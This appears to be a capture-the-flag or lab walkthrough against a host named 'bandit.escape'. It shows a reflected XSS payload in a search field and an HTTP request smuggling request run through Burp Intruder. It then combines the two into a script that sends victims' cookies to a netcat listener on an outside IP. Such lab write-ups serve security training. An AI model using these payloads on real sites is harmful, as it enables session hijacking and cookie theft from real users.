
### Reflected XSS

Reflected XSS is a type of **Cross-Site Scripting (XSS)** attack where an attacker injects malicious scripts into a web application. The injected script is **reflected** off the web server and executed in the victim's browser.

**How It Works**

1. **Attacker crafts a malicious URL** containing a script.
2. **Victim clicks the link** (via phishing, comments, etc.).
3. **Web server reflects the input** without sanitization.
4. **Victim’s browser executes the script** (stealing cookies, session hijacking, etc.).

---

# Your job

Go to the home page. There's a **search** field.

So, insert the following code on the search field.

```
"><script>alert('1');</script>
```

After click on the Search button you'll see a pop up window like this:

![[Enumeration-20250325205126744.webp]]

>[!Success]
>The pagee is vulnerable to Reflected XSS.


## Apache 7.1.1 — HTTP Smuggling

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

This version of Apache is vulnerable to HTTP Smuggling. On this [web](https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/) you can learn more about this vulnerability.

### Exploit

Use the following payload on Burp Suite.

```
GET / HTTP/1.1
Host: bandit.escape
Accept: */*
Connection: keep-alive
Content-Length: 71
Transfer-Encoding: chunked

0
GET /?filter="><script>alert('1')%3B<%2Fscript> HTTP/1.1
Sth:
```

1. Intercept  the http://bandit.escape/?filter=%22%3E%3Cscript%3Ealert%28%271%27%29%3B%3C%2Fscript%3E with Burp Proxy.
2. Send the request to Intruder.
3. Select `Payloads` and set Payload type = `null payloads`.
	![[Exploitation-20250401202714479.webp]]
4. Check the option `Continue indefinitely`.
5. Start the attack.
	![[Exploitation-20250401202952664.webp]]

	Now, upon refreshing the page, we’ll see our XSS in action even though we’re not interacting with the page.

## XSS + HTTP Smuggling = Cookie Graber

Now, you have to combine both vulnerabilities.

There's a tool called [The PHP cookie stealer](https://github.com/TheWation/PhpCookieStealer) that can be use in XSS attacks to steal browser cookies from victims.

The plan is as follows:

1. Host a server that acts as a cookie grabber.
2. Then deploy an XSS payload redirecting to our server.
3. The server reads the cookie.
4. We replace the cookies.


---
# Your job

#Attacking_Machine 
1. Start a netcat listener.
```
nc -lnvp 9000
```

2. Craft a payload. 
```
"><script>document.write('<img src="http://10.50.97.227:9000/cookie.gif?cookie=' + document.cookie + '")/>');</script>
```

3. Paste the payload on the http://bandit.escape/ search field and send the request.
	![[Exploitation-20250401204856844.webp]]
4. You'll receive the response on the netcat listener.
	 ![[Exploitation-20250401205049182.webp]]
	 